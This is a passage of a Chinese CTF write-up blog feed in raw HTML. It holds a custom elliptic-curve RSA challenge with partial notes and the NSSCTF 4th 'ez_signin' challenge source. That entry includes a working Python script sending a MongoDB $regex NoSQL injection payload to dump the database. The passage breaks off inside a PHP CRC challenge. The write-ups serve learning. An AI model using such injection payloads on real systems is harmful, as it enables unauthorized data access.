class="line">[*] Flag: cnss&#123;9dbee80aaef3bfca2fb576a7e11d986f&#125;</span><br><span class="line">==================================================</span><br><span class="line">[*] 总计用时 <span class="number">9202.24</span>s</span><br></pre></td></tr></table></figure><p>$不负众望，我的电脑两个半小时拿下！$</p><h2 id="椭…椭圆曲线？2-🌂-壹雫空"><a href="#椭…椭圆曲线？2-🌂-壹雫空" class="headerlink" title="椭…椭圆曲线？2*(🌂 壹雫空)"></a>椭…椭圆曲线？2*(🌂 壹雫空)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">inf = -<span class="number">1</span></span><br><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">Pubkey = namedtuple(<span class="string">&#x27;Pubkey&#x27;</span>, [<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>])</span><br><span class="line">Privkey = namedtuple(<span class="string">&#x27;Privkey&#x27;</span>, [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Curve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">self, nbits, dbits</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span>(p % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span>(q % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        n = p * q</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = getRandomRange(<span class="number">1</span>,n)</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">pow</span>(r, (p-<span class="number">1</span>)//<span class="number">3</span>, p) != <span class="number">1</span>) <span class="keyword">and</span> (<span class="built_in">pow</span>(r, (q-<span class="number">1</span>)//<span class="number">3</span>, q) != <span class="number">1</span>)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        d = getPrime(dbits)</span><br><span class="line">        e = inverse(d, (p * p + p + <span class="number">1</span>) * (q * q + q + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> Pubkey(n, e, r), Privkey(p, q, d)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbits, dbits</span>):</span><br><span class="line">        self.Pubkey, self.Privkey = self.genkey(nbits, dbits)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        n, _, r = self.Pubkey</span><br><span class="line">        <span class="keyword">if</span>(a == Point(inf, inf)):</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        <span class="keyword">if</span>(b == Point(inf, inf)):</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line">        <span class="keyword">if</span>(a.y == inf):</span><br><span class="line">            a, b = b, a</span><br><span class="line">        u, v = a</span><br><span class="line">        p, q = b</span><br><span class="line">        <span class="keyword">if</span>(q == inf):</span><br><span class="line">            <span class="keyword">if</span>(v == inf):</span><br><span class="line">                <span class="keyword">return</span> Point((u * p) % n, (u + p) % n)</span><br><span class="line">            <span class="keyword">elif</span>((v + p) % n):</span><br><span class="line">                iv = inverse(v + p, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + r) * iv % n, (u + v * p) * iv % n)</span><br><span class="line">            <span class="keyword">elif</span>((u - v * v) % n):</span><br><span class="line">                iv = inverse(u - v * v, n) </span><br><span class="line">                <span class="keyword">return</span> Point((u * p + r) * iv % n, inf)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> Point(inf, inf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>((u + p + v * q) % n):</span><br><span class="line">                iv = inverse(u + p + v * q, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + (v + q) * r) * iv % n, (v * p + u * q + r) * iv % n)</span><br><span class="line">            <span class="keyword">elif</span>((v * p + u * q + r) % n):</span><br><span class="line">                iv = inverse(v * p + u * q + r, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + (v + q) * r) * iv % n, inf)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> Point(inf, inf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, a</span>):</span><br><span class="line">        k = self.Pubkey.e</span><br><span class="line">        res = Point(inf, inf)</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                res = self.product(res, a)</span><br><span class="line">            a = self.product(a, a)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, a</span>):</span><br><span class="line">        k = self.Privkey.d</span><br><span class="line">        res = Point(inf, inf)</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                res = self.product(res, a)</span><br><span class="line">            a = self.product(a, a)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">SYS = Curve(<span class="number">512</span>, <span class="number">256</span>)</span><br><span class="line">msg = Point(bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]),bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]))</span><br><span class="line">enc = SYS.encrypt(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pubkey = <span class="subst">&#123;SYS.Pubkey&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pubkey = Pubkey(n=4873189510606632670051462507037860421077551672164701436608907002436560192840356016750494285565924106988544952397402675547921930867836902302893011890256779, e=13378485234962864327763969254924381829836619219064695812825856516258702951436596931331119028308233868359134774242758549790397497067433124687542530097719178781601238604579006713726763589993220493028013459103929256891706082648574000763659034977028816094438365563682368664776491208827662655323646975736791610283, r=12276290027089634179666721556762461660058574159904682072699747683370547320796053531346228587347389593630764829928291692127976550810879034430985232250912)</span></span><br><span class="line"><span class="string">enc = Point(x=2091733356436558288163136748650604712672684547651742349852169921359344595959145998331036292720052611932763413100160720842985758067666744134352011068441384, y=3606887286200111465466487525784448417643735862168228528263397534620187006806130329379762200338558634931139253300267143260393005244954232632353514520202318)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>自定义公钥系统，不一样的<code>KMOV</code>？<br><code>p % 3 == 1</code>，见过<code>余2</code>的，还没见过<code>余1</code>的<br><strong>椭圆曲线上的RSA</strong></p><p>这题的方向应该是基于<strong>大整数很难被分解</strong>，关键是要找到<code>r</code>怎么去利用？<br>暂时就这么些思考了……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;p&gt;原来是这样，去年招新赛的题放到了&lt;code&gt;summer&lt;/code&gt;，那新生就惨喽&lt;br&gt;&lt;img src</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF 4th-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/</id>
    <published>2025-08-24T10:25:48.000Z</published>
    <updated>2025-09-15T18:58:22.981Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png" alt=""><br>哦豁，这场化身<strong>AI大师</strong>，周末上大分</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>), <span class="string">&quot;description&quot;</span>: b.get(<span class="string">&quot;description&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><strong>NoSQL 注入 (MongoDB 注入)</strong>，通过<code>post</code>字典参数，<strong>绕过</strong>过滤函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造目标 URL</span></span><br><span class="line">URL = <span class="string">&quot;http://node9.anna.nssctf.cn:29421/search&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 攻击载荷 (Payload) ---</span></span><br><span class="line"><span class="comment"># 利用 MongoDB 的 $regex 操作符来匹配所有文档，从而 dump 出全部数据。</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 请求头 ---</span></span><br><span class="line"><span class="comment"># 必须指定 Content-Type 为 application/json</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送恶意请求并获取 flag 的主函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 准备攻击目标: <span class="subst">&#123;URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用的 Payload: <span class="subst">&#123;json.dumps(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送 POST 请求</span></span><br><span class="line">        response = requests.post(URL, headers=headers, json=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应状态码</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] 请求成功！服务器返回状态码 200 OK。&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 解析返回的 JSON 数据</span></span><br><span class="line">                books = response.json()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> books:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] 查询成功，但未返回任何书籍信息。&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 查询到以下书籍信息：&quot;</span>)</span><br><span class="line">                <span class="comment"># 格式化输出结果</span></span><br><span class="line">                <span class="keyword">for</span> i, book <span class="keyword">in</span> <span class="built_in">enumerate</span>(books, <span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n--- 第 <span class="subst">&#123;i&#125;</span> 本书 ---&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  书名 (Title): <span class="subst">&#123;book.get(<span class="string">&#x27;title&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  作者 (Author): <span class="subst">&#123;book.get(<span class="string">&#x27;author&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  描述 (Description): <span class="subst">&#123;book.get(<span class="string">&#x27;description&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Flag 可能隐藏在以上信息中，请仔细查找。&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 错误：无法解析服务器返回的 JSON 数据。&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    原始响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 攻击失败！服务器返回状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 发生未知错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compute_crc16</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$checksum</span> = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$checksum</span> ^= <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$checksum</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$checksum</span> = ((<span class="variable">$checksum</span> &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$checksum</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$checksum</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculate_crc8</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$crc8_table</span> = [</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">        <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span 